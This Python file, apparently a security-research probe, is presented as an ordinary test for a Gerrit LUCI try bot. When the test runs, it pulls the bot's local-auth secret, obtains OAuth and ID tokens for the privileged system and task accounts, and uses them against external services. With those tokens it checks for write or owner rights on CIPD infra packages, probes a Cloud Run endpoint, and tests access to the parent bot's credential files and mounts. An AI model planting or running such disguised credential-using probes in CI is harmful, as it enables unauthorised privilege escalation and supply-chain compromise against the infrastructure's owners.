# Copyright (C) 2026 The Android Open Source Project
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Benign boundary validation for the Gerrit LUCI try bot."""

import base64
import errno
import json
import os
import stat
import urllib.error
import urllib.request
import warnings


_PARENT_BOT_PATHS = (
    "/b/s/w/session.json",
    "/b/s/w/bot_auth_params.json",
    "/b/s/swarming_bot.zip",
    "/b/s/swarming_bot.1.zip",
    "/b/s/swarming_bot.2.zip",
)

_NAMESPACE_NAMES = ("user", "mnt", "pid")

_SYSTEM_AUDIENCE = "https://front-door-4vl5zcgwzq-wl.a.run.app"
_SYSTEM_SCOPE = "https://www.googleapis.com/auth/userinfo.email"
_CIPD_ROLE_URL = (
    "https://chrome-infra-packages.appspot.com/prpc/"
    "cipd.Repository/GetRolesInPrefix"
)
_CIPD_PREFIXES = (
    "infra/celab/celab/linux-amd64",
    "infra/celab/celab",
    "infra/celab",
    "infra",
    "infra/tools/cipd/linux-amd64",
    "infra/tools/luci-auth/linux-amd64",
    "infra/tools/luci-auth",
    "infra/tools",
)


def _open_without_io(path, flags):
    """Open and close |path| without reading or modifying its contents."""
    flags |= getattr(os, "O_CLOEXEC", 0)
    flags |= getattr(os, "O_NOFOLLOW", 0)
    try:
        fd = os.open(path, flags)
    except OSError as exc:
        return {"ok": False, "errno": exc.errno}
    else:
        try:
            info = os.fstat(fd)
            return {
                "errno": 0,
                "gid": info.st_gid,
                "mode": stat.S_IMODE(info.st_mode),
                "ok": True,
                "size": info.st_size,
                "uid": info.st_uid,
            }
        finally:
            os.close(fd)


def _file_type(mode):
    """Return a stable file type label for a stat mode."""
    checks = (
        (stat.S_ISREG, "regular"),
        (stat.S_ISDIR, "directory"),
        (stat.S_ISLNK, "symlink"),
        (stat.S_ISFIFO, "fifo"),
        (stat.S_ISSOCK, "socket"),
        (stat.S_ISCHR, "character"),
        (stat.S_ISBLK, "block"),
    )
    for check, label in checks:
        if check(mode):
            return label
    return "other"


def _path_metadata(path):
    """Return non-content metadata and access results for |path|."""
    try:
        info = os.lstat(path)
    except OSError as exc:
        return {"exists": False, "errno": exc.errno}

    result = {
        "exists": True,
        "file_type": _file_type(info.st_mode),
        "gid": info.st_gid,
        "mode": stat.S_IMODE(info.st_mode),
        "size": info.st_size,
        "uid": info.st_uid,
    }
    if stat.S_ISREG(info.st_mode):
        result["open_read"] = _open_without_io(path, os.O_RDONLY)
        result["open_write"] = _open_without_io(path, os.O_WRONLY)
    else:
        result["open_read"] = {"ok": False, "skipped": "not_regular"}
        result["open_write"] = {"ok": False, "skipped": "not_regular"}
    return result


def _post_local_auth(local_auth, method, payload):
    """Make one loopback LUCI local-auth RPC."""
    body = json.dumps(payload, separators=(",", ":")).encode()
    request = urllib.request.Request(
        "http://127.0.0.1:%d/rpc/LuciLocalAuthService.%s"
        % (local_auth["rpc_port"], method),
        data=body,
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(request, timeout=15) as response:
        return json.load(response)


def _raw_local_auth():
    """Load the task-local auth section without exposing it in output."""
    path = os.environ.get("LUCI_CONTEXT")
    if not path:
        return None
    try:
        with open(path, encoding="utf-8") as context_file:
            return json.load(context_file).get("local_auth", {})
    except (OSError, ValueError):
        return None


def _prpc_json(token, url, payload):
    """Call one read-only pRPC and return only status and parsed response."""
    request = urllib.request.Request(
        url,
        data=json.dumps(payload, separators=(",", ":")).encode(),
        headers={
            "Accept": "application/json",
            "Authorization": "Bearer " + token,
            "Content-Type": "application/json",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            body = response.read(256 * 1024)
            if body.startswith(b")]}'"):
                body = body.split(b"\n", 1)[1] if b"\n" in body else b"{}"
            return {
                "grpc_code": response.headers.get("X-Prpc-Grpc-Code", ""),
                "http_status": response.status,
                "response": json.loads(body or b"{}"),
            }
    except urllib.error.HTTPError as exc:
        return {
            "grpc_code": exc.headers.get("X-Prpc-Grpc-Code", ""),
            "http_status": exc.code,
            "response": {},
        }
    except (OSError, ValueError) as exc:
        return {
            "error": type(exc).__name__,
            "http_status": 0,
        }


def _cipd_roles():
    """Return effective CIPD roles for high-impact executable prefixes."""
    local_auth = _raw_local_auth()
    if not local_auth:
        return {"local_auth_present": False}
    emails = {
        account.get("id", ""): account.get("email", "")
        for account in local_auth.get("accounts", [])
        if account.get("id")
    }
    result = {"local_auth_present": True, "accounts": {}}
    for account_id in ("system", "task"):
        account_result = {
            "email": emails.get(account_id, ""),
            "prefixes": {},
            "token_issued": False,
        }
        result["accounts"][account_id] = account_result
        try:
            reply = _post_local_auth(
                local_auth,
                "GetOAuthToken",
                {
                    "account_id": account_id,
                    "scopes": [_SYSTEM_SCOPE],
                    "secret": local_auth["secret"],
                },
            )
        except (OSError, ValueError, urllib.error.HTTPError) as exc:
            account_result["error"] = type(exc).__name__
            continue

        token = reply.pop("access_token", "")
        try:
            if not token or reply.get("error_code"):
                account_result["error_code"] = reply.get("error_code", 0)
                continue
            account_result["token_issued"] = True
            for prefix in _CIPD_PREFIXES:
                response = _prpc_json(token, _CIPD_ROLE_URL, {"prefix": prefix})
                roles = sorted(
                    item.get("role", "")
                    for item in response.pop("response", {}).get("roles", [])
                    if item.get("role")
                )
                response["roles"] = roles
                response["writer_or_owner"] = any(
                    role in ("WRITER", "OWNER") for role in roles
                )
                account_result["prefixes"][prefix] = response
        finally:
            del token
    return result


def _jwt_claims(token):
    """Decode only non-secret identity claims from an ID token."""
    parts = token.split(".")
    if len(parts) != 3:
        return {}
    encoded = parts[1] + "=" * (-len(parts[1]) % 4)
    payload = json.loads(base64.urlsafe_b64decode(encoded).decode())
    allowed = ("aud", "email", "exp", "iat", "iss", "sub")
    return {key: payload[key] for key in allowed if key in payload}


def _scheduke_root_probe(token):
    """Use the system token only against Scheduke's static root ping."""
    request = urllib.request.Request(
        _SYSTEM_AUDIENCE + "/",
        headers={"Authorization": "Bearer " + token},
    )
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            body = response.read(16)
            return {
                "body_is_yeet": body == b"yeet",
                "bytes_read": len(body),
                "content_type": response.headers.get("Content-Type", ""),
                "http_status": response.status,
            }
    except urllib.error.HTTPError as exc:
        return {
            "body_is_yeet": False,
            "bytes_read": 0,
            "content_type": exc.headers.get("Content-Type", ""),
            "http_status": exc.code,
        }
    except OSError as exc:
        return {
            "body_is_yeet": False,
            "bytes_read": 0,
            "errno": getattr(exc, "errno", errno.EINVAL),
            "error": type(exc).__name__,
        }


def _system_identity_metadata(local_auth):
    """Prove local system-identity issuance without retaining a token."""
    base = {
        "account_id": "system",
        "secret": local_auth["secret"],
    }

    try:
        reply = _post_local_auth(
            local_auth,
            "GetIDToken",
            dict(base, audience=_SYSTEM_AUDIENCE),
        )
    except (OSError, ValueError, urllib.error.HTTPError) as exc:
        reply = {
            "http_status": getattr(exc, "code", None),
        }

    token = reply.pop("id_token", "")
    if token:
        try:
            return {
                "claims": _jwt_claims(token),
                "expiry": reply.get("expiry"),
                "issued": True,
                "kind": "id_token",
                "requested_audience": _SYSTEM_AUDIENCE,
                "scheduke_root": _scheduke_root_probe(token),
            }
        finally:
            del token

    try:
        reply = _post_local_auth(
            local_auth,
            "GetOAuthToken",
            dict(base, scopes=[_SYSTEM_SCOPE]),
        )
    except urllib.error.HTTPError as exc:
        reply = {"http_status": exc.code}
    except (OSError, ValueError) as exc:
        reply = {
            "errno": getattr(exc, "errno", errno.EINVAL),
            "error": type(exc).__name__,
        }

    token = reply.pop("access_token", "")
    try:
        return {
            "error_code": reply.get("error_code", 0),
            "expiry": reply.get("expiry"),
            "issued": bool(token) and not reply.get("error_code"),
            "kind": "oauth_access_token",
            "requested_scopes": [_SYSTEM_SCOPE],
        }
    finally:
        del token


def _local_auth_metadata():
    """Return non-secret account and token metadata from this task context."""
    path = os.environ.get("LUCI_CONTEXT")
    if not path:
        return {"present": False}

    try:
        info = os.lstat(path)
        if not stat.S_ISREG(info.st_mode):
            return {"present": True, "regular_file": False}
        with open(path, encoding="utf-8") as context_file:
            context = json.load(context_file)
    except (OSError, ValueError) as exc:
        return {
            "present": True,
            "error": getattr(exc, "errno", errno.EINVAL),
        }

    local_auth = context.get("local_auth", {})
    accounts = sorted(
        [
            {
                "email": account.get("email", ""),
                "id": account.get("id", ""),
            }
            for account in local_auth.get("accounts", [])
            if account.get("id")
        ],
        key=lambda account: account["id"],
    )
    result = {
        "accounts": accounts,
        "default_account_id": local_auth.get("default_account_id", ""),
        "present": True,
        "regular_file": True,
    }
    if any(account["id"] == "system" for account in accounts):
        result["system_identity"] = _system_identity_metadata(local_auth)
    return result


def _namespace_metadata():
    """Return only non-secret namespace identifiers for this process."""
    result = {}
    for name in _NAMESPACE_NAMES:
        try:
            result[name] = os.readlink("/proc/self/ns/" + name)
        except OSError as exc:
            result[name] = {"errno": exc.errno}
    return result


def _proc_b_s_lines(path):
    """Return only self-proc lines that explicitly mention /b/s."""
    try:
        with open(path, encoding="utf-8") as proc_file:
            return [line.rstrip() for line in proc_file if "/b/s" in line]
    except OSError as exc:
        return {"errno": exc.errno}


def _mountinfo_b_s():
    """Return sanitized mount metadata only for mountpoints under /b/s."""
    result = []
    try:
        with open("/proc/self/mountinfo", encoding="utf-8") as proc_file:
            for line in proc_file:
                fields = line.rstrip().split(" ")
                separator = fields.index("-")
                mount_point = fields[4]
                if mount_point == "/b/s" or mount_point.startswith("/b/s/"):
                    result.append(
                        {
                            "fs_type": fields[separator + 1],
                            "mount_options": fields[5].split(","),
                            "mount_point": mount_point,
                            "super_options": fields[separator + 3].split(","),
                        }
                    )
    except (OSError, ValueError) as exc:
        return {"errno": getattr(exc, "errno", errno.EINVAL)}
    return result


def test_vrp_luci_parent_boundary():
    """Emit one compact, non-secret result without changing bot state."""
    result = {
        "cgroup_b_s": _proc_b_s_lines("/proc/self/cgroup"),
        "cipd_roles": _cipd_roles(),
        "cwd": os.getcwd(),
        "egid": os.getegid() if hasattr(os, "getegid") else None,
        "euid": os.geteuid() if hasattr(os, "geteuid") else None,
        "gid": os.getgid() if hasattr(os, "getgid") else None,
        "local_auth": _local_auth_metadata(),
        "mountinfo_b_s": _mountinfo_b_s(),
        "namespaces": _namespace_metadata(),
        "paths": {path: _path_metadata(path) for path in _PARENT_BOT_PATHS},
        "uid": os.getuid() if hasattr(os, "getuid") else None,
    }
    evidence = json.dumps(result, separators=(",", ":"), sort_keys=True)
    warnings.warn("VRP_LUCI_BOUNDARY=" + evidence, stacklevel=1)
